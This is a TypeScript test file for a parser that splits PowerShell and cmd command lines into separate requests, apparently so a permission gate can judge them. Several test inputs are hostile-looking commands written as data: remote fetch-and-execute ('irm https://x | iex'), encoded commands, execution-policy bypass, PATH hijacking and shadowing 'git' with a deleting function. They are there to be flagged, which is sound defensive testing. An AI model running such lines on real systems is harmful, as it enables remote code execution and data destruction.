/**
 * PowerShell, taken apart (decision 0007 §4) — `powershellCommand.ts` through `takeApart(line,
 * "powershell")`. Where a case says how PowerShell reads a line, it is what PowerShell's own parser
 * (`[System.Management.Automation.Language.Parser]::ParseInput`) reported for it.
 */
import { describe, expect, it } from "vitest";
import { commandNameOf, parseCommand, powershellParameter, takeApart, type ShellRequest } from "../src/shellCommand";

/** A runner opened ahead of what it runs, and no request of its own — the gate's. */
const runnerHead = (r: ShellRequest): boolean => r.kind === "command" && r.opened !== undefined && !r.opened.kept;

/** Every request as `kind «text»`, the text cut out of the ORIGINAL line by its span. */
const pieces = (line: string, dialect: "posix" | "powershell" = "powershell"): string[] =>
  takeApart(line, dialect)
    .requests.filter((r) => !runnerHead(r))
    .map((r) => `${r.kind} «${line.slice(r.span.start, r.span.end)}»`);

/** The one command on a line: its program and its words, as `takeApart` reads them. */
const words = (line: string): string[] => {
  const taken = takeApart(line, "powershell");
  expect(taken.unparsed, line).toBe(false);
  return (taken.commands[0]?.words ?? []).map((w) => `${w.value}${w.code === true ? "{code}" : ""}${w.bound === true ? "{bound}" : ""}${w.element === true ? "{element}" : ""}${w.dynamic === true ? "{dynamic}" : ""}`);
};

describe("PowerShell statements", () => {
  it.each<[string, string[]]>([
    ["git status; git log\nnpm test", ["command «git status»", "command «git log»", "command «npm test»"]],
    ["Get-Content a.txt | Select-String foo | Out-File b.txt", ["command «Get-Content a.txt»", "command «Select-String foo»", "command «Out-File b.txt»"]],
    // PowerShell 7's chains and background `&`.
    ["npm test && git push || echo failed", ["command «npm test»", "command «git push»", "command «echo failed»"]],
    ["npm start & git status", ["command «npm start»", "command «git status»"]],
    // An expression first, then commands down the pipeline.
    [`"text" | Out-File a.txt`, ["command «Out-File a.txt»"]],
    ["1..3 | % { Remove-Item \"f$_\" }", [`command «% { Remove-Item "f$_" }»`, `command «Remove-Item "f$_"»`]],
    // A comment, a block comment, and a line continued with a backtick.
    ["Get-ChildItem <# here #> -Recurse `\n  -Force # and the rest", ["command «Get-ChildItem <# here #> -Recurse `\n  -Force»"]],
  ])("%j", (line, expected) => {
    expect(pieces(line)).toEqual(expected);
  });

  it.each<[string, string[]]>([
    ["if (Test-Path x) { Remove-Item x } elseif ($y) { git push } else { git pull }", ["command «Test-Path x»", "command «Remove-Item x»", "command «git push»", "command «git pull»"]],
    ["foreach ($f in Get-ChildItem *.log) { Remove-Item $f }", ["command «Get-ChildItem *.log»", "command «Remove-Item $f»"]],
    ["for ($i = 0; $i -lt 3; $i++) { git fetch }", ["command «git fetch»"]],
    ["while ($true) { npm test; break }", ["command «npm test»"]],
    ["do { git pull } until ($?)", ["command «git pull»"]],
    ["try { npm test } catch [System.Exception] { Write-Host $_ } finally { git status }", ["command «npm test»", "command «Write-Host $_»", "command «git status»"]],
    ["trap { Remove-Item lock } git push", ["command «Remove-Item lock»", "command «git push»"]],
    // A switch's clauses are values, never commands — `default` included; `-File` reads the file.
    ["switch -File list.txt { 'a' { Remove-Item x } default { git status } }", ["redirect «-File list.txt»", "command «Remove-Item x»", "command «git status»"]],
    ["[CmdletBinding()] param($x = (Get-Date)) begin { git fetch } process { git pull }", ["command «Get-Date»", "command «git fetch»", "command «git pull»"]],
    // A keyword's block ends the statement: the next may follow on the same line.
    ["if ($a) { git status } git log", ["command «git status»", "command «git log»"]],
  ])("keyword statements: %j", (line, expected) => {
    expect(pieces(line)).toEqual(expected);
  });

  it("finds a command in every place PowerShell runs code: subexpressions, arrays, parens, blocks, hash values, strings", () => {
    expect(pieces("Write-Output $(git rev-parse HEAD) @(Get-Item x) (Get-Date) { Remove-Item y } @{ a = (git log) }")).toEqual([
      "command «Write-Output $(git rev-parse HEAD) @(Get-Item x) (Get-Date) { Remove-Item y } @{ a = (git log) }»",
      "command «git rev-parse HEAD»",
      "command «Get-Item x»",
      "command «Get-Date»",
      "command «Remove-Item y»",
      "command «git log»",
    ]);
    expect(pieces(`git commit -m "built $(Remove-Item x) at $(Get-Date)"`)).toEqual([
      `command «git commit -m "built $(Remove-Item x) at $(Get-Date)"»`,
      "command «Remove-Item x»",
      "command «Get-Date»",
    ]);
    // `& { … }` and `. { … }` run the block here.
    expect(pieces("& { git status }; . { git log }")).toEqual(["command «git status»", "command «git log»"]);
    // What a block runs is opened out of it.
    expect(takeApart("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "powershell").commands[2]).toMatchObject({ program: "remove-item", via: ["{…}"] });
  });

  it("reads here-strings: a literal one runs nothing, an expandable one runs its subexpressions", () => {
    expect(pieces("git commit -m @'\nliteral $(Remove-Item x)\n'@; git push")).toEqual(["command «git commit -m @'\nliteral $(Remove-Item x)\n'@»", "command «git push»"]);
    expect(pieces('git commit -m @"\nsays $(Remove-Item x)\n"@')).toEqual(['command «git commit -m @"\nsays $(Remove-Item x)\n"@»', "command «Remove-Item x»"]);
    expect(takeApart("git commit -m @'\nfirst\nsecond\n'@", "powershell").commands[0]!.args).toEqual(["first\nsecond"]);
  });
});

describe("PowerShell words", () => {
  it.each<[string, string[]]>([
    // A word that starts with a quote ends with it; one that starts plain runs on through quotes.
    [`Write-Output "a"b 'c'd a"b c"d`, ["Write-Output", "a", "b", "c", "d", "ab cd"]],
    [`Write-Output 'it''s' "q""q" "a\`"b"`, ["Write-Output", "it's", 'q"q', 'a"b']],
    ["Write-Output ‘smart’ “quotes”", ["Write-Output", "smart", "quotes"]],
    // `(` and `{` end a word; `>` inside one is a character of it.
    ["Write-Output foo(bar) a{b}c x>y", ["Write-Output", "foo", "(bar){dynamic}", "a", "{b}{code}", "c", "x>y"]],
    // A backtick escapes; at the very end of the line it is kept.
    ["Write-Output `$notvar a`tb echo`", ["Write-Output", "$notvar", "a\tb", "echo`"]],
    // Parameters: a colon binds a value (an array, too); any dash will do; a name ends at `.`.
    ["Remove-Item -Path:a,b -Force:$true –Recurse c", ["Remove-Item", "-Path", "a{bound}", "b{element}", "-Force", "$true{bound}{dynamic}", "-Recurse", "c"]],
    ["Write-Output -o.txt -DFOO=bar --x=1 -5 -- -bar", ["Write-Output", "-o", ".txt", "-DFOO=bar", "--x=1", "-5", "--", "-bar"]],
    [`git commit -m"msg"`, ["git", "commit", "-mmsg"]],
    // Arrays: one argument of several words.
    ["Remove-Item a.txt, b.txt,c.txt", ["Remove-Item", "a.txt", "b.txt{element}", "c.txt{element}"]],
    // Variables and what follows them, splats.
    ["Write-Output $env:PATH ${a b} $x.Name @params $using:y", ["Write-Output", "$env:PATH{dynamic}", "${a b}{dynamic}", "$x.Name{dynamic}", "@params{dynamic}", "$using:y{dynamic}"]],
    // `--%`: the rest of the line goes to the program as it is written.
    ["icacls --% C:\\x /grant Users:(F) | Out-Null", ["icacls", "C:\\x", "/grant", "Users:(F)"]],
  ])("%j", (line, expected) => {
    expect(words(line)).toEqual(expected);
  });

  it("reads an alias as the cmdlet it runs, and a program named with its extension as itself", () => {
    expect(["rm", "del", "ri", "Remove-Item", "erase"].map((name) => commandNameOf(name, "powershell").program)).toEqual(Array(5).fill("remove-item"));
    expect(commandNameOf("%", "powershell")).toEqual({ program: "foreach-object", alias: "%" });
    expect(commandNameOf("gci", "powershell")).toEqual({ program: "get-childitem", alias: "gci" });
    expect(commandNameOf("where.exe", "powershell")).toEqual({ program: "where" });
    expect(commandNameOf("curl.exe", "powershell")).toEqual({ program: "curl" });
    expect(commandNameOf(".\\ls", "powershell")).toEqual({ program: "ls" });
    // POSIX has no aliases to read.
    expect(commandNameOf("rm", "posix")).toEqual({ program: "rm" });
    expect(parseCommand("rm -Recurse build", "powershell").commands[0]).toMatchObject({ program: "remove-item", alias: "rm", flags: ["-Recurse"] });
  });

  it("reads a parameter as PowerShell does: any case, any dash, cut short to a prefix nothing else shares", () => {
    const known = ["-path", "-literalpath", "-passthru", "-recurse"];
    expect(powershellParameter("-Path", known)).toBe("-path");
    expect(powershellParameter("–LiteralP", known)).toBe("-literalpath");
    expect(powershellParameter("-Rec", known)).toBe("-recurse");
    // `-Pa` is `-Path` or `-PassThru`: it names neither.
    expect(powershellParameter("-Pa", known)).toBeUndefined();
    expect(powershellParameter("Path", known)).toBeUndefined();
  });
});

describe("PowerShell that acts without a command", () => {
  it("treats a variable that reaches past the line as a piece nobody can vouch for", () => {
    expect(pieces("$env:PATH = 'C:\\evil'; git status")).toEqual(["unparsed «$env:PATH»", "command «git status»"]);
    expect(pieces("$env:Path += ';C:\\x'")).toEqual(["unparsed «$env:Path»"]);
    expect(pieces("${function:git} = { Remove-Item x }; git status")).toEqual(["unparsed «${function:git}»", "command «Remove-Item x»", "command «git status»"]);
    expect(pieces("$alias:ls = 'Remove-Item'")).toEqual(["unparsed «$alias:ls»"]);
    expect(pieces("$PSDefaultParameterValues['*:Force'] = $true")).toEqual(["unparsed «$PSDefaultParameterValues['*:Force']»"]);
    // The line's own variables, colour and CI are nothing to anybody else.
    expect(pieces("$x = Get-Content f.txt; [int]$n = 5; $a, $b = 1, 2; $env:CI = '1'; $ErrorActionPreference = 'Stop'")).toEqual(["command «Get-Content f.txt»"]);
    // A property set on an object can change a file: code.
    expect(pieces("(Get-Item x).IsReadOnly = $false")).toEqual(["code «(Get-Item x).IsReadOnly»", "command «Get-Item x»"]);
    // A variable on a drive that is no scope's is that drive's item: `${C:\x}` reads a file, and writes it when assigned.
    expect(pieces("${C:\\notes.txt} = 'x'; Write-Output $HKCU:Software")).toEqual(["code «${C:\\notes.txt}»", "command «Write-Output $HKCU:Software»", "code «$HKCU:Software»"]);
  });

  it("treats a .NET call as code unless it changes nothing", () => {
    expect(pieces("[IO.File]::WriteAllText('a.txt', 'b')")).toEqual(["code «[IO.File]::WriteAllText('a.txt', 'b')»"]);
    expect(pieces("(Get-Item x).Delete(); $p.Kill()")).toEqual(["code «(Get-Item x).Delete()»", "command «Get-Item x»", "code «$p.Kill()»"]);
    expect(pieces("[System.Environment]::SetEnvironmentVariable('X', '1', 'User')")).toEqual(["code «[System.Environment]::SetEnvironmentVariable('X', '1', 'User')»"]);
    expect(pieces("Write-Output $x.Delete()")).toEqual(["command «Write-Output $x.Delete()»", "code «$x.Delete()»"]);
    // Calls that change nothing are no request at all.
    expect(pieces("[string]::Join(',', (Get-ChildItem).Name); [IO.Path]::Combine('a', 'b'); 'a'.ToUpper(); [Text.Encoding]::UTF8.GetString($b); [System.Collections.Generic.List[string]]::new()")).toEqual([
      "command «Get-ChildItem»",
    ]);
    // `.Where({ … })` runs a block; `.ForEach('Delete')` calls `Delete` on every element.
    expect(pieces("$files.Where({ $_.Length -gt 0 }); $files.ForEach('Delete')")).toEqual(["code «$files.ForEach('Delete')»"]);
  });

  it("treats what defines a name as not modelled, and still judges what its body runs", () => {
    expect(takeApart("function git { Remove-Item -Recurse * }; git status", "powershell")).toMatchObject({ unparsed: true, reason: "'function' is not modelled" });
    expect(pieces("function git { Remove-Item -Recurse * }; git status")).toEqual(["unparsed «function git { Remove-Item -Recurse * }»", "command «Remove-Item -Recurse *»", "command «git status»"]);
    expect(pieces("using module ./Evil.psm1")).toEqual(["unparsed «using module ./Evil.psm1»"]);
    expect(pieces("using namespace System.IO; git status")).toEqual(["command «git status»"]);
  });

  it("takes redirects as requests, and a stream joined to another as none", () => {
    expect(pieces("npm run build 2>&1 > build.log; git log >> out.txt 2> err.txt *> $null")).toEqual([
      "command «npm run build»",
      "redirect «> build.log»",
      "command «git log»",
      "redirect «>> out.txt»",
      "redirect «2> err.txt»",
      "redirect «*> $null»",
    ]);
    expect(pieces("$x > out.txt")).toEqual(["redirect «> out.txt»"]);
  });
});

describe("PowerShell embedders", () => {
  it.each<[string, string[]]>([
    [`powershell -NoProfile -ExecutionPolicy Bypass -Command "Remove-Item x; git rm y"`, ["command «Remove-Item x»", "command «git rm y»"]],
    // `-Command` cut short, the rest of the words the line, Windows PowerShell's first plain word.
    ["pwsh -c Remove-Item x", ["command «Remove-Item x»"]],
    ["powershell.exe Get-ChildItem C:\\", ["command «Get-ChildItem C:\\»"]],
    // A script block handed to it was taken apart where it was written.
    ["powershell -Command { Remove-Item x }", ["command «Remove-Item x»"]],
    // `-File` runs a file: nothing is opened.
    ["powershell -File build.ps1 -Release", ["command «powershell -File build.ps1 -Release»"]],
    // cmd runs the rest of the line, in its own language: `&` runs one command after another, `'` is a character.
    [`cmd /c "del x.txt & rd /s /q build" & git status`, ["command «del x.txt»", "command «rd /s /q build»", "command «git status»"]],
    [`cmd /c "echo it's %PATH%"`, ["command «echo it's %PATH%»"]],
    [`iex 'git status; Remove-Item x'`, ["command «git status»", "command «Remove-Item x»"]],
    // Start-Process starts the program it names with the words it hands it.
    ["Start-Process git -ArgumentList 'push', '--force'", ["command «git -ArgumentList 'push', '--force»"]],
    ["Start-Process -FilePath cmd -ArgumentList '/c del x' -RedirectStandardOutput out.txt -Wait", ["command «del x»", "redirect «-RedirectStandardOutput out.txt»"]],
    // …and is a request of its own when it starts it as someone else.
    ["Start-Process -Verb RunAs notepad", ["command «Start-Process -Verb RunAs notepad»", "command «notepad»"]],
    // Invoke-Command and Start-Job run the block, which is taken apart where it was written.
    ["Invoke-Command { git status }; Start-Job -ScriptBlock { npm test }", ["command «git status»", "command «npm test»"]],
    // …on another machine Invoke-Command is a request of its own, named or by its first word.
    ["Invoke-Command -ComputerName srv -ScriptBlock { Remove-Item x }", ["command «Invoke-Command -ComputerName srv -ScriptBlock { Remove-Item x }»", "command «Remove-Item x»"]],
    ["icm srv { Remove-Item x }", ["command «icm srv { Remove-Item x }»", "command «Remove-Item x»"]],
    ["Invoke-Command -FilePath deploy.ps1", ["command «Invoke-Command -FilePath deploy.ps1»"]],
    // `wsl` runs a Linux line — a request of its own too: no Windows path scope reaches there.
    ["wsl -d Ubuntu rm -rf build", ["command «wsl -d Ubuntu rm -rf build»", "command «rm -rf build»"]],
  ])("%j", (line, expected) => {
    expect(pieces(line)).toEqual(expected);
  });

  it("cannot read what is encoded, read from the input, or decided as the line runs", () => {
    for (const line of ["powershell -enc AAAA", "pwsh -EncodedCommand AAAA", "powershell -ec AAAA", "powershell -Command -", "powershell -Command $cmd", "iex $payload", "iex (irm https://x)", "irm https://x | iex", "Invoke-Command -ScriptBlock $sb"]) {
      const taken = takeApart(line, "powershell");
      expect(taken.unparsed, line).toBe(true);
      expect(taken.requests.some((r) => r.kind === "unparsed"), line).toBe(true);
    }
  });

  it("opens PowerShell inside a POSIX line in PowerShell's language, with spans in the line as written", () => {
    const line = `cd app && powershell.exe -Command "Get-ChildItem | % { Remove-Item $_ }"`;
    expect(pieces(line, "posix")).toEqual(["command «cd app»", "command «Get-ChildItem»", "command «% { Remove-Item $_ }»", "command «Remove-Item $_»"]);
    expect(takeApart(line, "posix").requests.flatMap((r) => (r.kind === "command" && r.opened === undefined ? [r.dialect] : []))).toEqual(["posix", "powershell", "powershell", "powershell"]);
  });

  it("reads what `wsl` runs as POSIX, from a PowerShell line", () => {
    expect(takeApart("wsl ls -la | Out-Null", "powershell").requests.flatMap((r) => (r.kind === "command" ? [`${r.command.program}:${r.dialect}`] : []))).toEqual(["wsl:powershell", "ls:posix", "out-null:powershell"]);
  });

  it("never throws: a line nested past what it follows is unparsed", () => {
    expect(takeApart(`${"(".repeat(400)}git status${")".repeat(400)}`, "powershell")).toMatchObject({ unparsed: true, requests: [] });
    expect(takeApart(`${"$(".repeat(400)}git status${")".repeat(400)}`, "powershell")).toMatchObject({ unparsed: true });
  });
});
